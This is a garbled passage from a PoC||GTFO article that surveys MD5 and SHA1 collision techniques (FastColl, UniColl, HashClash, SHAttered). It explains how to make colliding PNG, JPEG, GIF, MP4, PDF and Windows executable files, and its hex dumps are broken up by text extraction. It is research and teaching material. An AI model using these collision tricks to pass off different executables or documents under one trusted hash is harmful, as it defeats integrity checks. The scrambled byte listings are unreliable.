replaced by b, and so on.
a few seconds of computation
two blocks
no control before, no control after.
hard
..
..
..
..
26
B0
1D
38
20
1E
46
7B
Unicoll This technique was documented in 2012
in Marc Stevens’ Ph.D. thesis, “Attacks on Hash
Functions and Applications.” 23 The implementation
from 2017 is on Github. 24
FastColl The final version of FastColl is from
2009. Here is its scorecard and a quick print of
its difference mask, which describes which nybbles
of the block might change and which must remain
fixed.
Time:
Space:
Differences:
exploitation:
80
A3
99
E0
AD
59
4F
FF
You will find other examples, with an identical
prefix in fastcoll1.bin and fastcoll2.bin. A
variant of this is the single-block MD5 collision, but
that takes five weeks of computation! 22
File B
Suffix
10
0D
C3
F4
02
29
42
62
pocorgtfo19.pdf stevensthesis.pdf
clone https://github.com/cr-marcstevens/hashclash && emacs hashclash/scripts/poc_no.sh
23Time:
Space:
Exploitation:
..
..
..
..
..
..
a few minutes (depending on the number
of bytes you want to control)
two blocks
Very easy: controlled bytes before and
after the difference, and the difference
is predictable. The only restrictions are
alignment and that you only control ten
bytes after the difference.
..
..
DD ..
+1 ..
..
..
..
..
..
..
55
20
FE
04
4B
C6
E1
9F 6E
32
F6
05
14
EB
3F
D2 69
30
31
FB
D7
21
B0
0C 43-6F
62-F5
3A-63
39-33
F2-47
F2-F6
DB-E8
00-86 6C
48
DB
21
53
59
B4
C8 6C
34
99
64
84
9A
AA
ED 20-31
B9-3B
3E-77
BF-0D
BA-12
85-14
B0-D5
DE-85 20
1C
4D
A4
2D
73
56
7F 70
01
C7
FE
4F
04
22
03 72-65
9F-C8
5A-6E
E2-A6
BB-83
DD-57
AF-B9
7B-05 66
6B
B0
9D
78
5F
04
28 69
E6
A6
83
6C
40
26
D7 78
44
88
36
70
3C
FC
0F
00:
10:
20:
30:
40:
50:
60:
70: 55
20
FE
04
4B
C6
E1
9F 6E
32
F6
05
14
EB
3F
D2 69
30
31
FB
D7
21
B0
0C 43-6F
62-F5
3A-63
39-33
F2-47
F2-F6
DB-E8
00-86 6C
48
DB
21
53
59
B4
C8 6C
34
99
64
84
9A
AA
ED 20-31
B9-3B
3E-77
BF-0D
BA-12
85-14
B0-D5
DE-85 21
1C
4D
A4
2C
73
56
7F 70
01
C7
FE
4F
04
22
03 72-65
9F-C8
5A-6E
E2-A6
BB-83
DD-57
AF-B9
7B-05 66
6B
B0
9D
78
5F
04
28 69
E6
A6
83
6C
40
26
D7 78
44
88
36
70
3C
FC
0F
.. .. ..
?? ?? ??
00
00
00
00
00
00
00
00
02
1a
02
18
c0
20
c0
b0
00
00
00
00
?? ?? ??
.. .. ..
00
00
00
00
10
10
10
10
b4
24
b4
00
00
00
00
00
00
00
00
00
1c
1c
1c
0c
3c
ec
2c
b8
00
00
00
00
00
00
00
00
04
14
04
10
pocorgtfo18.pdf uses the computed SHA1 pre-
fixes, reusing the image directly from PDFL A TEX’s
source, but also checking the value of the prefixes
via JavaScript in the HTML page. The file is a
polyglot, valid as a ZIP, HTML, and PDF. (See
PoCkGTFO 18:10.)
UniColl has less control than chosen prefix, but
it’s much faster especially since it takes only two
blocks.
It was used in the Google CTF of 2018, where
the frequency of a certificate serial changes and lim-
itations on the lengths prevented the use of chosen
prefix collisions. 25
SHAttered (SHA1) Documented in 2013 by
Marc Stevens, 26 computed in 2017. 27
Time:
Space:
Exploitation:
DD ??
or
DD ..
The difference between collision blocks of each
side is this Xor mask, with the practical collision
shown in Figure 3.
0c
bc
0c
bc
An example with N = 1 and 20 bytes of set text in
the collision blocks:
UniColl 1 00:
Prefix 10:
20:
30:
40:
50:
60:
70:
Differences:
6500 years CPU and 110 years GPU
two blocks
Medium. The differences are right at
the start and at the end of the collision
blocks. So no control before and after a
length in the prefix/in the suffix: PNG
stores its length before the chunk type, so
it won’t work. However, it will work with
JP2 files when they use the JFIF form
(the same as JPG), and likely MP4 and
other atom/box formats if you use long
lengths on 64bits (in this case, they’re
placed after the atom type).
25 https://github.com/google/google-ctf/tree/master/2018/finals/crypto-hrefin
26 https://marc-stevens.nl/research/papers/EC13-S.pdf
27 http://shattered.io
24File 1
000:
010:
020:
030:
040:
050:
060:
070:
080:
090:
0a0:
0b0:
0c0:
0d0:
0e0:
0f0:
100:
110:
120:
130:
2550
0a31
6820
2030
5375
6c74
5370
7468
436f
7265
2069
0923
7f46
45ca
14f8
6038
3057
42a4
e74d
6130
4446
2030
3220
2052
6274
6572
6163
2038
6d70
616d
7320
3975
dc93
67d6
6db1
e972
0fe9
802d
dc0f
9789
2d31
206f
3020
2f54
7970
2036
6520
2030
6f6e
0aff
6465
9c39
a6b6
88c7
6909
722f
d413
98b5
2cc1
606b
2e33
626a
522f
7970
6520
2030
3720
2052
656e
d8ff
6164
b1a1
7e01
f84b
01c5
e7ad
98ab
d70f
a874
d0bf
0a25 e2e3 cfd3 0a0a %PDF-1.3.%......
0a3c 3c2f 5769 6474 .1 0 obj.<</Widt
4865 6967 6874 2033 h 2 0 R/Height 3
6520 3420 3020 522f
0 R/Type 4 0 R/
3520 3020 522f 4669 Subtype 5 0 R/Fi
2052 2f43 6f6c 6f72 lter 6 0 R/Color
3020 522f 4c65 6e67 Space 7 0 R/Leng
2f42 6974 7350 6572 th 8 0 R/BitsPer
7420 383e 3e0a 7374 Component 8>>.st
fe00 2453 4841 2d31 ream......$SHA-1
comment length: 0x017f
2121 2121 2185 2fec
is dead!!!!!./.
c63c 4c97 e1ff fe01 .#9u.9...<L.....
3b02 9aaa 1db2 560b .F....~.;.....V.
8c4c 791f e02b 3df6 E.g....K.Ly..+=.
6b45 c153 0afe dfb7 ..m.i...kE.S....
728f 0e49 04e0 46c2 `8.rr/..r..I..F.
e12e f5bc 942b e335 0W...........+.5
2a33 2ec3 7fac 3514 B..-....*3....5.
cd0c 7830 5a21 5664 .M..,..t..x0Z!Vd
3f98 cda8 0446 29a1 a0..`k..?....F).
230: 0000 fffe 012d 0000 0000 0000 0000 ffe0
240: 0010 4a46 4946 0001 0101 0048 0048 0000 .....-..........
..JFIF.....H.H..
3a0: e9d6 d667 a7b0 7e65 1299 e39d 39c0 c7ff
3b0: d92d 2d2d 2dff e000 104a 4649 4600 0101
3c0: 0100 4800 4800 00ff db00 4300 0101 0101 ...g..~e....9...
.----....JFIF...
..H.H.....C.....
4e0: 4b14 97f7 7f39 fcd7 f1ff d90a 656e 6473
4f0: 7472 6561 6d0a 656e 646f 626a 0a0a 3220
500: 3020 6f62 6a0a 380a 656e 646f 626a 0a0a K....9......ends
tream.endobj..2
0 obj.8.endobj..
840: 3e0a 0a73 7461 7274 7872 6566 0a31 3830
850: 380a 2525 454f 460a >..startxref.180
8.%%EOF.
=
=
PDF header
image object
declaration
JPG header and
comment declaration
same hash at this point
first image data
second image data
(ignored)
PDF footer
File 2
2550
0a31
6820
2030
5375
6c74
5370
7468
436f
7265
2069
0923
7346
f9ca
18f8
dc38
3c57
fea4
eb4d
dd30
4446
2030
3220
2052
6274
6572
6163
2038
6d70
616d
7320
3975
dc91
67cc
6db3
e96a
0feb
8037
dc0d
9791
2d31
206f
3020
2f54
7970
2036
6520
2030
6f6e
0aff
6465
9c39
66b6
a8c7
a909
c22f
1413
b8b5
ecc1
d06b
2e33
626a
522f
7970
6520
2030
3720
2052
656e
d8ff
6164
b1a1
7e11
f85b
01d5
e7bd
98bb
d71f
a864
d0af
0a25 e2e3 cfd3 0a0a %PDF-1.3.%......
0a3c 3c2f 5769 6474 .1 0 obj.<</Widt
4865 6967 6874 2033 h 2 0 R/Height 3
6520 3420 3020 522f
0 R/Type 4 0 R/
3520 3020 522f 4669 Subtype 5 0 R/Fi
2052 2f43 6f6c 6f72 lter 6 0 R/Color
3020 522f 4c65 6e67 Space 7 0 R/Leng
2f42 6974 7350 6572 th 8 0 R/BitsPer
7420 383e 3e0a 7374 Component 8>>.st
fe00 2453 4841 2d31 ream......$SHA-1
comment length: 0x0173
2121 2121 2185 2fec
is dead!!!!!./.
c63c 4c97 e1ff fe01 .#9u.9...<L.....
8f02 9ab6 21b2 560f sF..f.~.....!.V.
a84c 7903 0c2b 3de2 ..g....[.Ly..+=.
df45 c14f 26fe dfb3 ..m......E.O&...
728f 0e45 bce0 46d2 .8.j./..r..E..F.
552e f5a0 a82b e331 <W......U....+.1
0e33 2edf 93ac 3500 ...7.....3....5.
790c 782c 7621 5660 .M.....dy.x,v!V`
3f98 cda4 bc46 29b1 .0...k..?....F).
0000 fffe 012d 0000 0000 0000 0000 ffe0
0010 4a46 4946 0001
0101 0048
0048 0000
comments
chain .....-..........
..JFIF.....H.H..
e9d6 d667 a7b0 7e65 1299 e39d 39c0 c7ff
d92d 2d2d 2dff e000 104a 4649 4600 0101
0100 4800 4800 00ff db00 4300 0101 0101 ...g..~e....9...
.----....JFIF...
..H.H.....C.....
4b14 97f7 7f39 fcd7 f1ff d90a 656e 6473
7472 6561 6d0a 656e 646f 626a 0a0a 3220
3020 6f62 6a0a 380a 656e 646f 626a 0a0a K....9......ends
tream.endobj..2
0 obj.8.endobj..
3e0a 0a73 7461 7274 7872 6566 0a31 3830
380a 2525 454f 460a >..startxref.180
8.%%EOF.
first image data
(ignored)
second image data
Figure 3. Shattered PoCs
Chosen-Prefix Collisions
Chosen prefix collisions allow us to collide any con-
tent, but they don’t exist for SHA1 yet.
?
unde
troL
r con
s
mnes
Rando
Suffix
1 | A
| != | B
|
| :−−−−:
| : − : | :−−−−:
|
3 | C o l l i s i o n ∗A∗ | != | C o l l i s i o n ∗B∗ |
ical
ident
HashClash The final version of this technique ap-
peared in 2009. 30 This collision of “yes” with “no”
that is shown in Figure 4 took three hours on twenty-
four cores. Note that this is a chosen prefix, and
that these files have nothing in common for the first
several bytes.
The steps are to first take two arbitrary prefixes,
then to pad the shorter so that their lengths match.
Both are then padded to the next block minus twelve
bytes, and those twelve bytes are populated at ran-
dom until a birthday search reveals a collision in the
x near-collision blocks appended to the prefixes.
Attacks Summary
The fewer blocks, the longer the computation
will take. While a single block took 400 kHours, 28
nine blocks took just seventy-two with HashClash. 29
Chosen prefix collisions are almighty, but they can
take a very long time.
Hash
MD5
SHA1
28 https://www.win.tue.nl/hashclash/SingleBlock/
29 git
X B
PREFI
PREFIX A
clone https://github.com/cr-marcstevens/hashclash
30 https://www.win.tue.nl/hashclash/ChosenPrefixCollisions/
25
Name
FastColl (’09)
UniColl (’12)
HashClash (’09)
Shattered (’13)
Time
2s
7–40m
72h
6500yr
Prefix Control
Identical
Identical
Chosen
Identical none
4–10 bytes
none
Prefix & Suffix“no” prefix:
Prefix, padding
“yes” prefix:
Prefix, padding
000:
010:
020:
030:
79
31
98
97
65
C1
17
25
73
D9
CA
A6
0A-3D
30-45
E3-A2
FB-00
62
FB
6B
00
84
BE
8E
00 11-01
1E-71
3D-44
00-49 75
F0
A9
08 D3
0A
8F
09 4D-EB
63-75
F2-0E
33-F0 80
A8
67
62 93
30
96
C4 DE
AA
48
E8
42
AA
0E
8F
BA
D9
7A
F2
66
3A
AE
F4
E3
55
90
F7
1E
96
F5
58
3A
21
2A
16
C5
F1
1F
CD 90-7F
19-43
FB-CD
D1-14
A8-03
19-09
07-4C
23-C5
39-8C
07-61
18-E2
8F-9C
06-96
4D-EC
AD-F6
88-19
3B-94
74-14
EB-BE
FB-50
83-7A
98-61
F6-D6
B8-84
EE-59
D9-86
83-60
08-65 9D
31
66
5F
E6
D3
24
07
F0
26
D0
50
F3
11
A0
73
CF
B3
54
23
C8
1A
A4
90
70
48
EC
D5 3D
1A
9A
3E
C0
DA
8B
61
8E
64
86
5C
B9
58
AD
85
5B
0C
3E
70
D5
65
81
8B
91
75
5C
5A 9A-67
DB-DA
DA-4F
B9-0F
31-A0
14-FD
13-0A
E4-80
7E-75
EA-6B
4F-20
78-DD
7C-77
59-92
0E-C6
C6
39-AA
54-73
AF-11
12-B0
B0
3A-BD
0F-08
DA-FC
B5-2B
E0-A1
26-4E
77-6E
FE-CA
4C-2E C4
96
20
9F
54
CB
54
91
25
83
00
CD
2D
45
D6
9B
5F
1C
24
ED
90
9B
0B
A7
9D
FE
17
C6 1B
01
8A
3E
D6
39
A2
B2
22
A2
30
72
EB
E1
88
E0
A8
F9
67
BE
1D
A4
E9
BD
C7
98
0C
BE 0F
54
AA
19
26
84
BC
13
1D
8D
26
89
25
33
12
8D
4A
47
3F
AC
99
BA
37
27
7C
84
74
54
000:
010:
020:
030:
D5
04
85
BA
09
3F
1F
C5
E7
A7
BE
0A
BA
1E
3E
B8
82
FD
C5
01
B8
2D
E1
44
C7
1D
EF
EB
F1
9F
B5
E3
9C
80
0D
12
79
3B
A3
71
D1
56
0E
74
BF
5B
7A
DD
32
7D
42
D2
7E
3D
3C
8E
54
19
9A
9C
BB
4C
77
7D
07
49
FF
DE
BF
70
A1
F2
9C
64
2C
95
DB
17
2B
E4
E6
AB
1C
9D
CD-CA
E8-92
88-D8
F0-78
A9-45
06-0F
5F-55
4F-E0
2A-CF
4A-32
BE-4E
1F-40
F9-96
D7-14
6E-FF
9E-DD
5E-58
CF-59
F7-D5
76-8D
AE-E8
34-4E
86-0C
23-14
17-1A
F1-B4
C7-16
F6-90
A1
C3
A5
31
89
C7
AA
5E
1B
A4
71
B4
80
1F
D9
53
42
D1
24
0D
DC
A8
94
7C
93
F4
5A
A3
6F
FA
19
4C
0A
4D
D7
08
E5-5F
34-B3
CF-6F
A3-00
D0
75
92
00
83
59
03
00 01-9B
46-56
9C-91
00-8D 4D
97
AA
B6 55
EF
A5
4E 06-61
6C-4A
DA-56
47-FF AB
07
92
AF 88
90
C1
7A 11
CC
04
3C
42
AA
0E
8F
BA
D9
7A
F2
66
3A
AE
F4
E3
55
90
F7
1E
96
F5
58
3A
21
2A
16
C5
F1
1F
CD 90-7F
19-43
FB-CD
D1-14
A8-03
19-09
07-4C
23-C5
39-8C
07-61
18-E2
8F-9C
06-96
4D-EC
AD-F6
88-19
3B-94
74-14
EB-BE
FB-50
83-7A
98-61
F6-D6
B8-84
EE-59
D9-86
83-60
08-65 9D
31
66
5F
E6
D3
24
07
F0
26
D0
50
F3
11
A0
73
CF
B3
54
23
C8
1A
A4
90
70
48
EC
D5 3D
1A
9A
3E
C0
DA
8B
61
8E
64
86
5C
B9
58
AD
85
5B
0C
3E
70
D5
65
81
8B
91
75
5C
5A 9A-67
DB-DA
DA-4F
B9-0F
31-A0
14-FD
13-0A
E4-80
7E-75
EA-6B
4F-20
78-DD
7C-77
59-92
0E-CA
CA
39-AA
54-73
AF-11
12-70
70
3A-BD
0F-08
DA-FC
B5-2B
E0-A1
26-4E
77-6E
FE-CA
4C-2E C4
96
20
9F
54
CB
54
91
25
83
00
CD
2D
45
D6
9B
5F
1C
24
ED
90
9B
2B
A7
9D
FE
17
C6 1B
01
8A
3E
D6
39
B2
B2
22
A2
30
72
EB
E1
88
E0
A8
F9
67
BE
1D
A4
E9
BD
C7
98
0C
BE 0F
54
A9
19
26
84
BC
13
1D
8D
22
89
25
33
12
8D
4A
47
3F
AC
99
BA
37
27
7C
84
54
54
Collision blocks start
Collision blocks start
040:
050:
060:
070:
080:
090:
0A0:
0B0:
0C0:
0D0:
0E0:
0F0:
100:
110:
120:
130:
140:
150:
160:
170:
180:
190:
1A0:
1B0:
1C0:
1D0:
1E0:
1F0:
6E
8A
FE
E6
040:
050:
060:
070:
080:
090:
0A0:
0B0:
0C0:
0D0:
0E0:
0F0:
100:
110:
120:
130:
140:
150:
160:
170:
180:
190:
1A0:
1B0:
1C0:
1D0:
1E0:
1F0:
D5
04
85
BA
09
3F
1F
C5
E7
A7
BE
0A
BA
1E
3E
B8
82
FD
C5
01
B8
2D
E1
44
C7
1D
EF
EB
F1
9F
B5
E3
9C
80
0D
12
79
3B
A3
71
D1
56
0E
74
BF
5B
7A
DD
32
7D
42
D2
7E
3D
3C
8E
54
19
9A
9C
BB
4C
77
7D
07
49
FF
DE
BF
70
A1
F2
9C
64
2C
95
DB
17
2B
E4
E6
AB
1C
9D
CD-CA
E8-92
88-D8
F0-78
A9-45
06-0F
5F-55
4F-E0
2A-CF
4A-32
BE-4E
1F-40
F9-96
D7-14
6E-FF
9E-DD
5E-58
CF-59
F7-D5
76-8D
AE-E8
34-4E
86-0C
23-14
17-1A
F1-B4
C7-16
F6-90
A1
C3
A5
31
89
C7
AA
5E
1B
A4
71
B4
80
1F
D9
53
42
D1
24
0D
DC
A8
94
7C
93
F4
5A
A3
Figure 4. A Chosen Prefix Collision from HashClash
26Exploitation
Identical prefix collisions are rather limited, but for
all their versatility, chosen prefix collisions are a lot
more time consuming to create.
Another approach is to craft reusable prefixes
via either identical-prefix attack such as UniColl—
or chosen prefix to overcome some limitations—but
reuse that prefix pair in combinations with two pay-
loads like a classic identical prefix attack.
Once a good prefix pair has been computed, we
can instantly collide two source files. It’s just a mat-
ter of massaging file data so that it fits both the file
format specifications and the precomputed prefix re-
quirements.
PNG with a Comment First
The biggest limitation of PNG is that it uses
CRC32 at the end of its chunks, which would pre-
vent the use of collision blocks. But as a happy co-
incidence, most parsers ignore these checksums and
we can as well!
The image meta data (dimensions, color space,
etc.) are stored in the IHDR chunk, which should be
right after the signature, before any potential com-
ment. It would mean that we can only precompute
collisions of images with the same metadata. How-
ever, that chunk can actually be located after a com-
ment block for the vast majority of readers. So we
can put the collision data before the header, which
enables to collide any pair of PNG with a single pre-
computation.
Since a PNG chunk has a length of four bytes,
there’s no need to modify the structure of either file.
We can simply jump over a whole image in one go.
We can insert as many discarded chunks as we
want, so we can add one for alignment, then one
which length will be altered by a UniColl. The
lengths will be 00 75 and 01 75.
So an MD5 collision of two arbitrary PNG im-
ages is instant, with no prerequisite—no computa-
tion, just some minor file changes—and needs no
chosen-prefix collision, just UniColl. See png.py,
which collided these two logos from competing man-
ufacturers.
JPEG
The Application segment should in theory follow
just after the Start of Image marker, but thankfully
this isn’t required in practice. The lets us make our
collision generic, and the only limitation is the size
of the smallest image.
A comment’s length is stored in two bytes, lim-
ited to 65,536 bytes, which would be something like
a 400 × 400 photo. To jump to another image, its
Entropy Coded Segment needs to be split to scans
which are smaller than this, either by storing the
image progressively or by using jpegtran to apply
custom scan sizes.
So an MD5 collision of two arbitrary JPGs is in-
stant, and needs no chosen-prefix collision, just Uni-
Coll. See jpg.py for a handy script to collide pho-
tographs of your two authors to collision*.jpg.
27PNG with IHDR First Most parsers of PNGs
happily accept files that start with a chunk other
than IHDR. However, some readers, notably Safari
and Preview—do you known of any others, gentle
reader?—do not tolerate it.
In this case, the image header and its properties
(dimensions, color space) must be the first, before
any collision blocks Both colliding files must then
have the same properties.
Conveniently, UniColl is up to the task, and, of
course, the computed prefix pair can be reused for
any other pair of files with the same properties. The
script pngStd.py will collide any pair of such files.
It launches UniColl if needed to compute the prefix
pair.
tions of their own, we only have to (1) normalize
the palette, (2) set the first frame’s duration to the
maximum, and (3) draft a comment that jumps to
the start of the first frame data, so that the com-
ment will sled over the image data as a comment,
and end the same way, until a null length is encoun-
tered. Then the parser will find the next frame and
display it.
So with some minor setup—only a few hundred
bytes of overhead—we can sled over any GIF image
and work around the 256 bytes limitation. Kudos
to Marc for this nifty trick!
In the end, the current GIF limitations for in-
stant MD5 collisions are that (1) it must have no
animation, (2) the images must be normalized to a
single palette, 31 (3) the images must the same di-
mensions, and (4) that after eleven minutes, both
files will display the same final frame. Here are two
MD5-colliding GIFs by KidMoGraph.
GIF
The GIF format is tricky for a number of reasons.
It stores its metadata in the header before any com-
ment is possible, so there can’t be a generic prefix
for all GIF files. If the file has a global palette, it is
also stored before a comment is possible. Its com-
ment chunk length is encoded by a single byte, so
that the length of any comment chunk is capped at
a maximum of 256 bytes.
However, the comment chunks follow a pe-
culiar structure: it’s a chain of “<length:1>”
“<data:length>” until a null length is defined. This
makes any non-null byte a valid “jump forward”,
which makes it suitable to be used with FastColl,
as shown in PoCkGTFO 14:11.
So, although we can’t have a generic prefix, we
can at least collide any pair of GIF with same meta-
data (dimensions, palette), and we only need a sec-
ond of FastColl to compute its prefix.
Now the problem is that we can’t jump over a
whole image, as we would in PNG. Nor can we jump
over a big structure, as we would in JPG.
A possible workaround is to massage the com-
pressed data or to chunk the image into tiny areas—
as in the case of the GIF Hashquine—but this is not
optimal.
Yet there is another idea, which works generi-
cally with only a few limitations! It was suggested
by Marc, and it’s brilliant.
Note that the image data also follows the
“<length, data>” sequence format. We can abuse
this together with the GIF’s animation feature. If
the two GIFs we want to collide have no anima-
31 gifsicle
Portable Executable The Portable Executable
has a peculiar structure, with a vestigial DOS header
that points to a second structure, the PE header.
This header must be at offset 0, and it has the
fixed length of a full block, ending with a PE header
pointer that is beyond UniColl’s reach, so only a
chosen prefix collision is useful in colliding PE files.
So the strategy is to move the PE header further
into the file to leave room for a colliding block after
the DOS header, then use chosen prefix collisions to
fork a DOS header that points to two different PE
offsets, with two different PE headers. These sec-
tions can follow each other, so long as you apply a
delta to the offsets of the two section tables.
–use-colormap web
28This means that it’s possible to instantly collide
any pair of PE executables—even if they use differ-
ent subsystems or architectures! Although executa-
bles collisions are typically trivial via any loader,
this kind of exploitation is transparent: the code is
identical and loaded at the same address.
Attached you will find two colliding PEs: a GUI
applicaton tweakPNG.exe (as collision1.exe)
and a CLI application, fastcoll.exe (as
collision2.exe). Windows never allows these two
to meet, except in an MD5 collision! The script
pe.py generates instant collisions of Windows Exe-
cutables, sharing a hash but running different soft-
ware.
The curious case of “Runtime R6002 - float-
ing point not loaded” MSVC libraries check sec-
tions for permissions. This check can be patched
out. Patch the following to set eax to 1 instead. 32
1 C1E81F s h r
F7D0
not
3 83 E001 and
eax , 0 1 F
eax
eax , 1
If you apply collisions on packed files, (such as
UPX-ed files, to prevent specific PDF keywords like
endstream from being visible in cleartext), the off-
sets will change, and this may cause the packer to
fail to restore the right attributes. So you may
want to patch out that code before UPX-ing the
executable and colliding it.
MP4 and Others The MP4 format’s container
is a sequence of “Length Type Value” chunks called
Atoms. The Length is a 32-bit big-endian and cov-
ers itself, the Type and the Value, so the minimum
Length is 0x0008, covering an empty value and a
four-byte type.
If the Length is null, then the atom takes the
rest of the file, such as jp2c atoms in JP2 files. If
it’s 1, then the Type is followed by a 64-bit length,
changing the atom to “Type Length Value”, mak-
ing it handily compatible with other collisions like
SHAttered. 33
Some atoms contain other atoms: in this case,
they’re called boxes. That’s why this otherwise un-
named structure is called the “Atom/Box.”
This Atom/Box format used in MP4 is actually
a derivate of Apple’s Quicktime, and it is used by
many other formats including JP2, HEIF, and F4V.
34
The first atom’s type is usually ftyp, which en-
ables the parsers to differentiate the actual file for-
mat.
The format is quite permissive. To make a colli-
sion, just chain “free” atoms, abuse one’s length with
UniColl, then jump over the first payload.
For MP4 files, the only thing to add is to adjust
the stco (Sample Table Chunk Offsets) or the co64
(its 64-bit equivalent) tables, since they are absolute
offsets pointing to the mdat movie data. These rules
are actually enforced, too!
32 See
the manhunter.ru article, “Runtime error r6002 floating point not loaded.”
neighbors, is the kind of format cleverness that extracts its costs in bugs, blood, and meathooks. Avoid it when you
design your own formats! —PML
34 See http://www.ftyps.com/ for more.
33 This,
29Koblitz: while we are all standing on the shoul-
ders of giants, we might as well know their faces.
( collision1.jp2 and collision2.jp2)
The attached script mp4.py will instantly col-
lide arbitrary video. As we already mentioned,
it may be portable to other formats than MP4.
The examples can be found in collision1.mp4 and
collision2.mp4.
Note that some viewers (OS X, Safari, Firefox)
don’t allow a file that starts with an Atom that is
not ftyp. In this case, the prefix has to cover this,
and it’s not so generic. Besides that it’s the same
strategy as before, only limited to a single fixed file
type.
JPEGs in a PDF, as in SHAttered Unless this
is your very first issue of this modest journal, neigh-
bors, you probably agree that as a format, PDF is
the king of polyglots, and arguably also of syntactic
malleability and ambiguity. If however this is your
first issue, then do spend a few moments looking up
what formats the previous electronic issues doubled
as besides being valid (or valid-at-the-time) PDF
files—but be warned, it may turn you into a format
syntax nerd or make you forever destroy your faith
in signature-based security if you still have any.
JPEG2000 JPEG2000 files usually start with the
Atom/Box structure like MP4, followed by the last
atom jp2c that typically ends the MP4 file (null
length), then from this point on it follows the JFIF
structure of a JPEG file (starting with FF 4F as a
segment marker).
The pure-JFIF form is also tolerated, in which
case collision is like that of JPEGs: SHAttered-
compatible, but with comments limited to 64Kb.
On the other hand, if you manipulate JPEG2000
files with the Atom/Box encoding, you don’t have
this limitation.
As mentioned before, if you’re trying to collide
this structure and if there are more restrictions—
for example, starting with a free atom is not tol-
erated by some format—then you can compute an-
other set of UniColl prefix pairs specific to this for-
mat. JPEG2000 seems to enforce a jP atom first
before the usual ftyp, but that’s the only restric-
tion. There’s no need to relocate anything.
So jp2.py is even simpler! Enjoy the collid-
ing JPEG2000 images of Oded Goldreich and Neal
Yet the SHAttered attack, which produced col-
liding PDF files of different contents, was not a PDF
trick per se, but a JPG trick wrapped in a PDF. The
collision of the PDFs is enabled by both of them con-
taining a JPG-compressed object with crafted con-
tents; the PDFs need to be totally identical other-
wise.
Note that the colliding documents can be to-
tally normal, and can freely use the collision JPG
anywhere in their displayed renderings, e.g., on any
page of multi-page documents.
The original examples from the SHAttered paper
looked as follows, and are included in the examples
as shattered1.pdf and shattered2.pdf.
30For example, these two valid PDF files are equiv-
alent to each other.
1 %PDF−1.
1 0 obj <</Pages 2 0 R>>e n d o b j
3 2 0 obj <</Kids [ 3 0 R] / Count 1>>e n d o b j
3 0 obj <</Parent 2 0 R>>e n d o b j
5 t r a i l e r <</Root 1 0 R>>
1 %PDF−1.
11 0 obj <</Pages 12 0 R>>e n d o b j
3 12 0 obj <</Kids [ 1 3 0 R] / Count 1>>e n d o b j
13 0 obj <</Parent 12 0 R>>e n d o b j
5 t r a i l e r <</Root 11 0 R>>
Some tricks then immediately suggest them-
selves, as storing unused objects in a PDF is hap-
pily tolerated. We can also skip object number, and
there’s even an official way to skip numbers in the
trailing XREF table at the end of the document.
So storing two document trees in the same file
is okay. We only need to make the root objects of
the colliding documents to refer to the desired tree
at will. To do this, we just take two documents,
renumber their objects and references so that there
is no overlap, and craft a collision so that the ele-
ment number referenced as the Root object can be
changed while keeping the same hash value. This
trick is a perfect fit for UniColl with N = 1, so long
as we adjust the XREF table accordingly.
This way, we can safely collide any pair of PDFs,
no matter what their page numbers, dimensions, im-
ages, etc. might be.
When native resolution images are required, you
can use a nifty trick to make a lossless JPEG! Just
repeat each pixel across eight columns and eight
rows in a greyscale image, as JPEG blurs across fun-
damental blocks that are 8 × 8.
PDF collisions with MD5 We can do MD5 col-
lisions at the document level of PDF, with no re-
strictions at all on either file! Recall that PDF has
a very different structure compared to other file for-
mats, in that it uses object numbers and references
to define a tree of objects. The interpretation of the
whole document depends on the Root element, but
there are many syntactically different tree structures
that will be rendered identically.
root catalog#1 pages#2
pages#3 content#4 Hello World!
trailer
31
catalog#1 catalog#11
pages#2 pages#12
page#3 page#13
content#4 content#14
Hello World! Bye World!PDF can store foreign data in two ways, as a
line comment or as a stream object. In a line com-
ment, the only forbidden characters are newlines (\r
and \n). This can be used inside a dictionary ob-
ject, e.g., to modify an object reference, via UniColl.
The following is a valid PDF object even though it
contains binary collision blocks—just retry until you
have no newline characters.
1
3
5
1 0 obj
<< /Type / C a t a l o g /MD5_is /
REALLY_dead_now__ / Pages 2 0 R
. . . some u g l y b i n a r y g o e s h e r e . . .
>>
endobj
In a stream object, any data is possible, but since
we’re inside an object, we can’t alter the rest of the
PDF structure. So we need a Chosen Prefix colli-
sion to modify the structure outside the containing
stream object.
The first case serves to highlight the beauty
of UniColl, a collision where differences are pre-
dictable, so that you can write poetry in colliding
data—thanks to Jurph! 35
Rather than modifying the structure of the doc-
ument and fooling parsers, we’ll just use collision
blocks directly to produce differing texts, with al-
ternate readings!
1
3
5
7
9
V
Now he hash MD5,
No enemy c a r e s !
Only he gave
the shards .
Can ’ t be owned &
h i s t r u e gold ,
l i k e One F r a i l ,
sound a s f o l d .
^
Colliding Document Structure Whether you
use UniColl as inline comment or Chosen Prefix in a
dummy stream object, the strategy is similar: shuf-
fle objects numbers around, then make the Root ob-
ject point to different objects. Unlike SHAttered,
this means instant collision of any arbitrary pair of
PDFs, at document level.
The MuPDF suite provides a useful trick:
mutool clean output is reliably predictable, so it
can be used to normalize PDFs as input and fix your
merged PDF while keeping the important parts of
the file unmodified. MuTool doesn’t discard bogus
key/values from PDF dictionaries unless asked, and
keeps them in the same order, so using fake dictio-
nary entries such as /MD5_is /REALLY_dead_now__
is perfect for aligning things predictably with-
out needing another kind of comments. However,
mutool won’t keep comments in dictionaries, so it
won’t support inline-comment tricks.
V
Now he hath MD5,
No enemy d a r e s !
Only he have
the shares .
Can ’ t be pwned &
h i s t r u e hold ,
l i k e One G r a i l ,
sound a s g o l d .
^
An easy way to do the object-shuffling operation
without hassle is just to merge both PDF files via
mutool merge then split the /Pages object in two.
To make room for this object, just merge a dummy
PDF in front of the two documents.
You will find these colliding poems in
poeMD5_A.pdf and poeMD5_B.pdf, a true crypto-
graphic artistic creation!
Optionally, you can create a fake reference to a
dangling array to prevent garbage collection from
deleting the second set of pages.
The script pdf.py takes less than a second (see
pdf.log) to collide the two public PDF papers
like Spectre and Meltdown (collision1.pdf and
collision2.pdf.)
35 unzip
pocorgtfo19.pdf word-decrementer.zip || git clone https://github.com/Jurph/word-decrementer
32The previous techniques work with any pair of
existing PDF files, but even better, you can com-
pile colliding files with PDFL A TEX directly from TEX
sources. You will nee PDFTEX’s special operators
for this. 37
With these operators, you can define objects
directly—including dummy key and values for
alignments—and define empty objects to reserve
some object slots by including this at the very start
of your TEX sources:
% s e t PDF v e r s i o n l o w
\ p d f m i n o r v e r s i o n =3
to
prevent
s t r e a m XREF
\ begingroup
% d i s a b l e compression to keep
\ p d f c o m p r e s s l e v e l =0\ r e l a x
Here’s a possible extension: chain UniColl blocks
to also keep pairs of the various non-critical objects
that can be referenced in the Root object—such as
